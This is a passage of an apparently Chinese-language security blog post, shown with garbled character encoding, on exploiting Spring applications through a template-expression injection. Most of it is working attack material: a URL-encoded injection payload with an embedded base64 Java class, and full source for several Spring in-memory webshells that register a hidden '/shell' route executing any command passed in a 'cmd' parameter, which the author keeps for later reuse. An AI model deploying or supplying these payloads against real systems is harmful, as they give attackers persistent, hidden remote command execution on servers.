class="hljs-title class_">InjectToController2</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªæŠŠå‰é¢çš„å†…å­˜é©¬é­”æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆä¸‹é¢è¿™æ ·å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshellChange</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;?&gt; requestMappingHandlerMappingClass = requestMappingHandlerMapping.getClass();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> requestMappingHandlerMappingClass.getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>            configField.setAccessible(<span class="hljs-literal">true</span>);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerMapping</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getMethod(<span class="hljs-string">&quot;registerMapping&quot;</span>, Object.class, Object.class, Method.class);<br>            registerMapping.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshellChange.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">methodsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br><br>            registerMapping.invoke(requestMappingHandlerMapping, info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshellChange</span>(), executeCommand);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;)</span> String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/admin?language=__$%7BT%20(org.springframework.cglib.core.ReflectUtils).defineClass(%22SpringRequestMappingMemshellChange%22,T%20(org.springframework.util.Base64Utils).decodeFromUrlSafeString(%22yv66vgAAADQAsAoACwBaCABbCgALAFwIADgKAAoAXQoAXgBfCgBeAGAHAGIIADwHAGMHAGQHAGUKAAoAZgoADABfBwBnCAA-BwBoCgAKAGkHAGoHAGsKABMAbAgAbQoAYQBuCwBvAHALAG8AcQoADwBaCgAMAHIIAHMHAHQKAB0AdQgAdgcAdwoAeAB5CgB4AHoKAHsAfAoAIAB9CAB-CgAgAH8KACAAgAcAgQkAggCDCgAoAIQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJExTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsQ2hhbmdlOwEACGRvSW5qZWN0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsBACFyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NvbmZpZ0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAEaW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAZAcAaAcAdAEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAIUBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAnU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbENoYW5nZS5qYXZhDAArACwBAAxpbmplY3Qtc3RhcnQMAIYAhwwAiACJBwCKDACLAIwMAI0AjgcAjwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kDACQAJEBACJTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsQ2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwwAkgCRAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAArAJMBAAYvc2hlbGwMAJQAlgcAlwwAmACZDACaAJsMAJwAnQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAngAsAQAMaW5qZWN0LWVycm9yAQARamF2YS91dGlsL1NjYW5uZXIHAJ8MAKAAoQwAogCjBwCkDAClAKYMACsApwEAAlxBDACoAKkMAKoAqwEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcArAwArQCuDAArAK8BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8BAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAA8ACwAAAAAAAwABACsALAABAC0AAAAvAAEAAQAAAAUqtwABsQAAAAIALgAAAAYAAQAAAAwALwAAAAwAAQAAAAUAMAAxAAAACQAyADMAAgAtAAABoQAHAAkAAACqEgJMKrYAA00sEgS2AAVOLQS2AAYtKrYAB8AACDoEKrYAAxIJBr0AClkDEgtTWQQSC1NZBRIMU7YADToFGQUEtgAOEg8SEAS9AApZAxIRU7YAEjoGuwATWQO9ABS3ABU6BwS9ABFZAxIWU7gAFxkEuQAYAgC5ABkBADoIGQUqBr0AC1kDGQhTWQS7AA9ZtwAaU1kFGQZTtgAbVxIcTKcAC00stgAeEh9MK7AAAQADAJ0AoAAdAAQALgAAAEYAEQAAAA4AAwAQAAgAEQAPABIAFAATAB4AFQA8ABYAQgAXAFQAGABhABoAewAcAJoAHQCdACEAoAAeAKEAHwClACAAqAAiAC8AAABmAAoACACVADQANQACAA8AjgA2ADcAAwAeAH8AOAA7AAQAPABhADwAPQAFAFQASQA-AD0ABgBhADwAPwBAAAcAewAiAEEAQgAIAKEABwBDAEQAAgAAAKoARQBGAAAAAwCnAEcASAABAEkAAAAMAAEACACVADQASgACAEsAAAATAAL_AKAAAgcATAcATQABBwBOBwBPAAAABQEARQAAAAEAPgBQAAQALQAAAGgABAADAAAAJrsAIFm4ACErtgAitgAjtwAkEiW2ACa2ACdNuwAoWSyyACm3ACqwAAAAAgAuAAAACgACAAAAJgAaACcALwAAACAAAwAAACYAMAAxAAAAAAAmAFEASAABABoADABSAEgAAgBTAAAABAABAFQATwAAAAUBAFEAAABVAAAADAEAAQBWAAEAV3MAUQACAFgAAAACAFkAOgAAABIAAgAIAGEAOQAJAG8AYQCVBgk=%22),nEw%20javax.management.loading.MLet(NeW%20java.net.URL(%22http%22,%22127.0.0.1%22,%221.txt%22),T%20(java.lang.Thread).currentThread().getContextClassLoader())).doInject(T%20(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(%22org.springframework.web.servlet.DispatcherServlet.CONTEXT%22,0).getBean(T%20(Class).forName(%22org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping%22)))%7D__::main.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241215001523048.png" alt="image-20241215001523048"></p><p>ç„¶åè®¿é—®&#x2F;shellè·¯ç”±cmdä¼ å‚å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20241215001604905.png" alt="image-20241215001604905"></p><h2 id="springå†…å­˜é©¬"><a href="#springå†…å­˜é©¬" class="headerlink" title="springå†…å­˜é©¬"></a>springå†…å­˜é©¬</h2><p>è¿™é‡Œé¡ºä¾¿æŠŠæ–‡ç« çš„å†…å­˜é©¬è®°å½•ä¸€ä¸‹ï¼Œä»¥åæ–¹ä¾¿ç”¨</p><p><strong>&lt;2.6.0</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-comment">// ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­testçš„ Method å¯¹è±¡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// é€šè¿‡åå°„è·å¾—è¯¥ç±»çš„testæ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// åˆ›å»ºç”¨äºå¤„ç†è¯·æ±‚çš„å¯¹è±¡ï¼ŒåŠ å…¥&quot;aaa&quot;å‚æ•°æ˜¯ä¸ºäº†è§¦å‘ç¬¬äºŒä¸ªæ„é€ å‡½æ•°é¿å…æ— é™å¾ªç¯</span><br>        <span class="hljs-type">InjectToController</span> <span class="hljs-variable">injectToController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br>    <span class="hljs-comment">// ç¬¬äºŒä¸ªæ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">(String aaa)</span> &#123;&#125;<br><br>    <span class="hljs-comment">// controlleræŒ‡å®šçš„å¤„ç†æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  IOException&#123;<br>        <span class="hljs-comment">// è·å–requestå’Œresponseå¯¹è±¡</span><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//å½“è¯·æ±‚æ²¡æœ‰æºå¸¦æŒ‡å®šçš„å‚æ•°(code)æ—¶ï¼Œè¿”å› 404 é”™è¯¯</span><br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>&gt;&#x3D;2.6.0</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController2</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>            configField.setAccessible(<span class="hljs-literal">true</span>);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController2.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br>            <span class="hljs-type">InjectToController2</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController2</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController2</span><span class="hljs-params">(String aaa)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            